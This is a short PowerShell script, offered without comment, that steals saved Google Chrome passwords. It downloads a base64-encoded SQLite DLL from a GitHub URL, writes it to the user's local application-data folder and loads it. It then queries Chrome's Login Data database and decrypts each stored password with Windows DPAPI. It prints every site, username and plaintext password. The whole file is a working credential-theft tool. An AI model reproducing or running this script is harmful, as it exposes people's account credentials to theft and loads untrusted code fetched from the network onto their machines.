Add-Type -Assembly System.Security
$assembly = (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/TimSchellin/Extract-ChromePasswords/master/SQLite_assembly.txt")
$content = [System.Convert]::FromBase64String($assembly)
$assemblyPath = "$($env:LOCALAPPDATA)\System.Data.SQLite.dll"
[System.IO.File]::WriteAllBytes($assemblyPath,$content)
Add-Type -Path $assemblyPath
$loginDatadb = "C:\$($env:HOMEPATH)\Local Settings\Application Data\Google\Chrome\User Data\Default\Login Data"
$connection = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$loginDatadb; Version=3;")
$OpenConnection = $connection.OpenAndReturn()
$query = "SELECT * FROM logins;"
$dataset = New-Object System.Data.DataSet
$dataAdapter = New-Object System.Data.SQLite.SQLiteDataAdapter($query,$OpenConnection)
[void]$dataAdapter.fill($dataset)
$dataset.Tables | Select-Object -ExpandProperty Rows | ForEach-Object {
	$encryptedBytes = $_.password_value
	$username = $_.username_value
	$purl = $_.action_url
	$decryptedBytes = [Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
	$plaintext = [System.Text.Encoding]::ASCII.GetString($decryptedBytes)
	write-output "login for: $purl `nusername: $username `npassword: $plaintext `n`n"
}

